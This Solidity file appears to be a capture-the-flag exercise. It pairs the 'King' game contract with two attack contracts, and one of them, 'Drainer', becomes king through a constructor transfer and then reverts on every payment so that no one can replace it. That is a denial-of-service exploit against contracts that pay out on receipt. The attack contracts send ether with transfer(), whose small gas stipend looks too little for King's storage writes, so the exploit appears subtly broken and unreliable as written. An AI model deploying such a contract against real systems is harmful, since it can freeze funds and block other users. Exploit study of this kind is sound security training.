pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}


contract BecomeKing{
    constructor(address adr) payable{
        payable(adr).transfer(msg.value);

    }

}

contract Drainer{
    fallback () external payable{
        require(false);
    }
constructor(address  adr)payable{
    payable(adr).transfer(msg.value);

}
}
